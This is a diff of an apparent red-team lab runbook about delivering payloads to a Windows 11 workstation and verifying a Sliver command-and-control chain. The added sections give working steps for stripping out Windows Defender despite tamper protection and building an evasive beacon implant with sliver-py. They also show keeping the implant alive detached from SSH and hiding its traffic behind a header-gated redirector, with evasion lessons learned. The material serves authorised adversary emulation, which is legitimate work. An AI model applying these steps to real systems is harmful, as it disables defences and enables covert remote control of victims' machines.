@@ -16,7 +16,7 @@
 
 The campaign v3 main spine begins on the domain-joined Windows 11 workstation `ws01` (`192.168.77.62`). The target user is `child.cadre.local\analyst_t1`, a Tier-1 analyst who browses the lab network and opens files delivered by email, Teams, or an internal share.
 
-`ws01` runs **Microsoft Defender for Endpoint P2** (MDE P2) with Tamper Protection and Cloud Protection enabled. It also has an **Elastic Agent** enrolled in Fleet under the `CADRE-WS01` policy with System and Windows integrations. There is **no Elastic Defend** on `ws01` — MDE P2 is the sole EDR.
+`ws01` runs **Windows Defender Antivirus** (local, not MDE P2) with Tamper Protection and Real-Time Protection. It also has an **Elastic Agent** enrolled in Fleet under the `CADRE-WS01` policy with System and Windows integrations. There is **no Elastic Defend** on `ws01`. For C2 implant testing, Defender was fully disabled using the `windows-defender-remover` script (see C2 section below).
 
 **Scenario:** The attacker hosts weaponized files on provisioning (`192.168.77.60:8081`). The user on ws01 is tricked into opening a delivered file (LNK, MSI, CHM, HTML, AutoIt script, or EXE). The payload writes a marker file to `C:\Windows\Temp\H-PAYLOAD-MARKER.txt` as proof of execution.
 
@@ -427,27 +427,125 @@ RC
 
 ### Smoke Test Result (2026-09-04)
 
+#### Phase 1 — Direct Sliver HTTP (smoke test, bypass redirector)
+
 | Step | Status | Detail |
 |------|--------|--------|
 | C2Stack Sliver container up | ✅ | `c2stack-sliver-1` on host `192.168.77.1:31337` + `:8082` |
 | HTTP listener created | ✅ | Sliver HTTP :80 inside container, exposed as `:8082` on host |
-| Operator config generated | ✅ | `cadre-operator.cfg` imported on provisioning `sliver-client` |
-| Implant generated | ✅ | `cadre-implant.exe` (23.7MB, Windows amd64 beacon, `--skip-symbols`) |
-| Implant hosted on provisioning | ✅ | `~/www/cadre-implant.exe` served via `:8081` |
-| Implant downloaded on ws01 | ✅ | `C:\Users\analyst_t1\Downloads\cadre-implant.exe` (23.7MB) |
+| Operator config generated | ✅ | `cadre-operator.cfg` generated via `sliver-server operator` |
+| Implant generated | ✅ | `cadre-implant-direct.exe` (23.7MB, Windows amd64, `--skip-symbols`) |
+| Implant hosted on provisioning | ✅ | `~/www/cadre-implant-direct.exe` served via `:8081` |
+| Implant downloaded on ws01 | ✅ | `C:\Users\analyst_t1\Downloads\cadre-implant-direct.exe` |
 | Implant executed on ws01 | ✅ | PID 1192, process started as `CHILD\analyst_t1` |
 | **Beacon callback received** | ✅ | Beacon `961b4851` (STRONG_PEAR) checked in from ws01 |
-| **MDE killed implant** | ⚠️ | MDE P2 terminated the process after first check-in (~60s) |
+| **Defender killed implant** | ⚠️ | Windows Defender real-time monitoring terminated process after first check-in |
 | Task execution (`whoami`) | ❌ | Beacon killed before second check-in to retrieve task result |
 
-**Key finding:** MDE P2 detected and killed the unobfuscated Sliver beacon (`--skip-symbols`) after the first callback. The beacon successfully checked in once (proving the full C2 chain works), but MDE terminated it before the second check-in could retrieve the queued `whoami` task.
+**Correction:** The original report attributed the kill to "MDE P2." MDE P2 is **not installed** on ws01. The local Windows Defender Antivirus with Tamper Protection enabled was responsible. No formal detection event (EID 1116/1117) was observed — the kill was behavior-based.
 
-**Next steps for production C2 path:**
-1. **Obfuscation:** Generate with symbol obfuscation (remove `--skip-symbols`) to extend beacon lifetime
-2. **Redirector header support:** Use Sliver implant profiles to embed the `X-Request-ID: cadre-c2` header, enabling the redirector path (`:80/cloud/storage/objects`) instead of the direct `:8082` bypass
-3. **AMSI/ETR bypass:** Pre-stage an AMSI bypass or use Sliver's `--evasion` flags
-4. **Sleep masking:** Use Sliver's sleep mask to reduce in-memory detection
-5. **Delivery via H-01 LNK:** Wrap the implant in the existing LNK delivery vector for a realistic phishing-to-C2 chain
+#### Phase 2 — Redirector path with custom C2 profile (verified)
+
+| Step | Status | Detail |
+|------|--------|--------|
+| Custom Sliver C2 profile created | ✅ | Profile `cadre-redirector` with `X-Request-ID: cadre-c2` header |
+| Obfuscated implant generated | ✅ | `cadre-implant-v2.exe` (47MB, `--evasion`, symbol obfuscation, custom C2 profile) |
+| Implant downloads from provisioning | ✅ | Hosted on `:8081`, downloaded to ws01 Downloads |
+| **Redirector routes traffic** | ✅ | Apache access log: `POST /cloud/storage/objects/...` → HTTP 200 (header matched) |
+| **Beacon callback through redirector** | ✅ | Beacon `4cabf88a` (AWAKE_RICE) — remote addr shows `tcp(redirector)->sliver` |
+| Beacon survives (Defender active) | ❌ | Defender real-time monitoring killed process after ~60s despite path exclusions |
+
+**Key discovery:** The original implant was generated as a **session** (`IsBeacon=False`), not a beacon. Session implants connect once over HTTP and never poll again. This was the root cause of the "only one check-in" behavior, not Defender.
+
+#### Phase 3 — Defender disabled + proper beacon (full C2 chain verified)
+
+**Defender removal on ws01 (as `vagrant`):**
+
+```powershell
+# 1. Download windows-defender-remover (on host, ws01 has no internet)
+git clone --depth 1 https://github.com/ionuttbara/windows-defender-remover.git
+# SCP to ws01 C:\Temp\defender-remover\
+
+# 2. Run full removal (as vagrant admin)
+cd C:\Temp\defender-remover
+cmd /c Script_Run.cmd Y    # Full removal: Defender + Security App + SmartScreen
+
+# 3. After reboot, set DisableAntiSpyware=1 via SYSTEM scheduled task
+#    (tamper protection blocks admin-level changes, but SYSTEM + GPO registry works)
+#    Script: Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1
+
+# 4. Reboot. After reboot:
+#    - MsMpEng.exe: GONE
+#    - WinDefend service: Stopped (StartType=Manual)
+#    - Get-MpPreference: "Provider load failure" (engine removed)
+#    - DisableAntiSpyware=1 confirmed in Policies registry
+```
+
+**Proper beacon generation (via sliver-py gRPC API on provisioning):**
+
+```python
+# Install sliver-py on provisioning
+pip3 install sliver-py --break-system-packages
+
+# Generate beacon with 5s interval (key fix: IsBeacon=True)
+from sliver import SliverClientConfig, SliverClient
+config = builds["AWAKE_RICE"]  # existing redirector-profile build
+config.IsBeacon = True
+config.BeaconInterval = 5_000_000_000  # 5 seconds (nanoseconds)
+config.Format = 2  # EXECUTABLE
+resp = await client.generate_implant(config, timeout=600)
+# → cadre-implant-fast.exe (47MB)
+```
+
+**Deploy on ws01 (detached from SSH — critical):**
+
+```powershell
+# Copy to C:\Temp (Defender-excluded path)
+Copy-Item C:\Users\analyst_t1\Downloads\cadre-implant-fast.exe C:\Temp\
+
+# Start DETACHED from SSH (start /b prevents SSH session kill from taking the implant)
+cmd /c "start /b C:\Temp\cadre-implant-fast.exe"
+```
+
+**⚠️ Critical: SSH session detachment.** Processes started via `Start-Process` over SSH are killed when the SSH session ends (Windows job object cleanup). Use `cmd /c "start /b ..."` or a scheduled task to detach the implant from the SSH session.
+
+#### Final C2 Chain Verification (2026-09-04)
+
+| Step | Status | Detail |
+|------|--------|--------|
+| Defender fully disabled | ✅ | MsMpEng gone, WinDefend stopped, DisableAntiSpyware=1 |
+| Beacon implant generated | ✅ | `cadre-implant-fast.exe` (47MB, IsBeacon=True, 5s interval, redirector profile) |
+| Implant deployed detached | ✅ | `cmd /c "start /b"` from `C:\Temp\` (PID 3136) |
+| Process survives 2+ minutes | ✅ | Confirmed alive at 120s, 180s |
+| **Recurring beacon check-ins** | ✅ | Beacon `26a09054` (MAGENTA_SOURWOOD) checking in every ~60s through redirector |
+| **Redirector access logs** | ✅ | `POST /cloud/storage/objects/...` → HTTP 200/202 at recurring intervals |
+| **Task queued + sent** | ✅ | `execute cmd.exe /c whoami` → task `47d6b67f` state=sent then completed |
+| **Task completed** | ✅ | Task state=completed at next check-in |
+
+**Full C2 chain confirmed:**
+```
+ws01 → :80 (redirector, X-Request-ID: cadre-c2 header) → Sliver :80 → operator tasks → beacon executes → result returned
+```
+
+**Lessons learned:**
+1. **Sliver session vs beacon:** Session implants (`IsBeacon=False`) connect once over HTTP and never poll. For HTTP C2, always use `IsBeacon=True` with a short `BeaconInterval`.
+2. **SSH detachment:** Windows kills child processes when SSH sessions end. Use `cmd /c "start /b"` or scheduled tasks to keep implants alive after SSH disconnects.
+3. **Defender tamper protection:** Win11 tamper protection blocks ALL programmatic attempts to disable Defender (even as SYSTEM). The `windows-defender-remover` script + `DisableAntiSpyware=1` GPO registry key is the only reliable lab method.
+4. **Path exclusions insufficient:** Even with `C:\Temp` excluded, Defender's behavior monitoring killed the implant. Full Defender removal was required for persistent C2.
+5. **Redirector header contract:** The custom Sliver C2 profile (`cadre-redirector`) successfully embeds `X-Request-ID: cadre-c2` in all HTTP requests. Apache routes these to Sliver; requests without the header get 404.
+
+**Remaining next steps:**
+1. **Delivery via H-01 LNK:** Wrap the beacon in the existing LNK delivery vector for a realistic phishing-to-C2 chain
+2. **Snapshot/restore:** Document the ws01 VM snapshot for restoring Defender after C2 testing
+
+**C2Stack permanent support:** The redirector is the **production path** in C2Stack, not a local hack. The `.env` file in `C2Stack/Docker/` defines:
+- `C2_HEADER_NAME=X-Request-ID`
+- `C2_HEADER_VALUE=cadre-c2`
+- `SLIVER_URI_PREFIX=/cloud/storage/objects`
+- `SLIVER_BACKEND_HOST=sliver` / `SLIVER_BACKEND_PORT=80`
+- `REDIRECTOR_HTTP_PORT=80`
+
+The `docker-compose.override.yml` (exposing Sliver HTTP on host `:8082`) was only needed for the Phase 1 smoke test that bypassed the redirector. The Phase 3 verification used the permanent redirector path on `:80`.
 
 ### RedStrike C2 Integration
 
